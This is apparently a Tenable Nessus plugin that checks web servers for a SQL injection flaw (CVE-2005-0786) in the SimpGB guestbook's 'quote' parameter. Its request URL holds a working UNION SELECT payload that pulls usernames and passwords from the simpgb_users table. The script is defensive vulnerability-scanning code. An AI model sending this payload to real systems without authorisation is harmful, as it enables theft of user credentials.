#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(17328);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2005-0786");
  script_bugtraq_id(12801);
  script_xref(name:"OSVDB", value:"14773");

  script_name(english:"SimpGB guestbook.php quote Parameter SQL Injection");
  script_summary(english:"Checks for SQL injection in SimpGB");
 
  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server contains a PHP application that is vulnerable to\n",
      "a SQL injection attack."
    )
  );
  script_set_attribute(
    attribute:"description", 
    value:string(
      "The remote host is running SimpGB, a web-based guestbook application\n",
      "written in PHP.\n",
      "\n",
      "The version of SimpGB installed on the remote host fails to sanitize\n",
      "user input to the 'quote' parameter of the 'guestbook.php' script\n",
      "before using it in SQL queries.  An unauthenticated remote attacker\n",
      "can leverage this issue to manipulate database queries to read or\n",
      "write confidential data as well as potentially execute arbitrary\n",
      "commands on the remote web server."
    )
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://archives.neohapsis.com/archives/bugtraq/2005-03/0229.html"
  );
  script_set_attribute(
    attribute:"solution", 
    value:"Unknown at this time."
  );
  script_set_attribute(
    attribute:"cvss_vector", 
    value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
  );
  script_end_attributes();
 
  script_category(ACT_GATHER_INFO);
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_family(english:"CGI abuses");

  script_dependencie("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/simpgb", "/gb", "/guestbook", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  url = string(dir, "/guestbook.php?lang=de&mode=new&quote=-1%20UNION%20SELECT%200,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20FROM%20simpgb_users%20WHERE%201");
  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res)) exit(0);

  if (egrep(string:res[2], pattern:"Am 0000-00-00 00:00:00 schrieb "))
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
